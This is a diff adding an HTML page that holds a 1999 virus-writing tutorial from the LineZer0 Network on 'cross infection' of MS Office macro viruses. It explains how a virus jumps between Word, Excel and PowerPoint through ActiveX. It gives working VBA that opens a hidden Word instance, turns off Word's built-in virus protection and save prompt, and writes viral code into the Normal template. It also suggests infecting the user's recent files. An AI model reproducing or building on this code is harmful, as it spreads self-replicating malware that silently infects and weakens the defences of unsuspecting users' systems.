@@ -1,0 +1,153 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Cross application macros</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Cross Infection ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</b>
+
+     .Introduction to cross macros
+     .The 'Cross macro' basics
+     .Cross infection technics
+
+   [ Music ]
+  
+     .Rage against the machine .The battle of Los Angeles
+     .Incubus .Make Yourself
+     .Radio Head .The bends
+
+<b>
+.Introduction to cross macros</b>
+
+    Cross application infections,  known from binary viruses we are able to
+infect for  example from one office  application to another one. If a virus
+is able to  jump from one application to  another we call it cross.  It's a
+good idea to use the cross idea, because it helps your virus to survive.
+
+    Jumping from one  application to another  gives the virus  more control
+over the user's applications.  Cross applications can infect two or more MS
+Office applications and are that way more resisdent and harder to clean.
+
+<b>
+.The 'Cross macro' basics</b>
+
+    First you have to know that it is possible to  jump across nearly every
+MS Office application except for Access. I am not sure about Access ;) Well
+for our cross infection it is the best way to use ActiveX communication be-
+tween the applications. Our possible classes for ActiveX are:
+
+ - Word.Application
+ - Excel.Application
+ - PowerPoint.Application
+ - MSProject.Application
+
+    To use this you use the CreateObject or GetObject command in VBA or VBS
+to get an ActiveX communication with the choosen application.  CreateObject
+would open a new application  hidden by default which we have to quit after
+infection and GetObject would use a allready opened application and use it.
+Once you opened an ActiveX communication you can use it like you code in an
+application you want to infect. Just put the object variable infront and do
+coding. ;) To understand what I mean read on in the next section.
+
+
+<b>.Cross infection technics</b>
+
+     I am not going to explain here any other technic than ActiveX technic,
+because the other ones are too  complicated and to obviously for a possible
+infection. Well, first is it a good idea to make some marker that tells you
+if have already  infected an application  cross on a computer.  For example
+let your virus drop a file with the name 'word.inf' to tell your virus that
+it has  already infected Word cross.  Well this is just an example  how you
+let the virus check. Another one could be writing in an .ini file or change
+the username of an application to get a marker.  All together, it is not so
+good to cross infect the applications everytime the virus gets executed. It
+would be too suspecious for the user,  but it is your decision. Ok, we have
+cleared this yet and now we are talking about the infection method. The po-
+ssibilities we have are to check if the applicaton we want to infect is al-
+ready open and infect it or if we make a hidden  Active X object and try to
+infect the application behind the users back in the background ;) 
+
+    Ok, now to start our working cross infection, use this command to check
+for an already active Word application. 
+
+ Set CrossObj = GetObject(,"Word.Application")
+
+    As you see we set the active Word application into the variable 'Cross-
+Obj'. So we suppose now that Word is active but for the case that it is not
+we should check it and if not we should create a new Active X communication
+with Word.
+
+ If CrossObj = "" Then 
+  Set CrossObj = CreateObject("Word.Application")
+  QuitObj = True
+ End If
+
+    Here we check if the application is open and if not we create a new one
+hidden in the background and of course we need to quit it after that. So we
+set a variable to the value true that  we later can check if we created one
+or if it was already present. If the application you want to infect was not
+active,  it is very important to quit it after  infection or it will remain
+running. To quit the application just simple use the following.
+
+ If QuitObj = True Then CrossObj.Quit
+
+    As you see, if the variable is true we quit the hidden application. Now
+we take a look on the basic infection of a Word 97 through the cross method
+using Active X.
+
+ Set CrossObj = GetObject(,"Word.Application")
+
+ If CrossObj = "" Then
+  Set CrossObj = CreateObject("Word.Application")
+  QuitObj = True
+ End If
+
+ If CrossObj.Application.UserName &lt;&gt; "Infected" Then 
+
+  CrossObj.Application.UserName = "Infected"
+
+  CrossObj.Options.VirusProtection = False
+  CrossObj.Options.SaveNormalPrompt = False
+
+  CrossObj.NormalTemplate.VBProject.VBComponents(1) _
+   .CodeModule.AddFromString VirusCode
+ 
+  CrossObj.NormalTemplate.Save
+
+  If QuitObj = True Then CrossObj.Quit
+
+ End If
+
+    This is a very simple example of a cross infection of Word. I will talk
+a bit about the single commands.  Well, first try to get an Active X object
+of an already open Word.  If there is no open Word create  a new one in the
+background an set the variable that checks for quitting.  For our infection
+marker we use the username of the application, we check for it and if it is
+unequal we do  the following steps.  First we set our marker,  then disable
+the build in virus protection of Word  and disable the prompting for saving
+the template of Word.  After that we insert our  viral code into  the class
+object section of the  default Word template 'NormalTemplate'.  Finally try
+to save it and if we where forced to create a hidden object we quit it. Ok,
+this routine is nearly the same when you infect for example Excel or Power-
+Point, etc. Just do a  few changes on the infection  technic and a  it is a
+good idea to infect for example the recent files of  the cross application.
+All in all, cross infection is a  nice technic to give  your virus a better
+spreading base.  So that's the little I want to explain you about cross in-
+fection and I am sure you can figure out the rest when there is one...;)
+
+                           -End Of Part #10-
+
+<b>=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
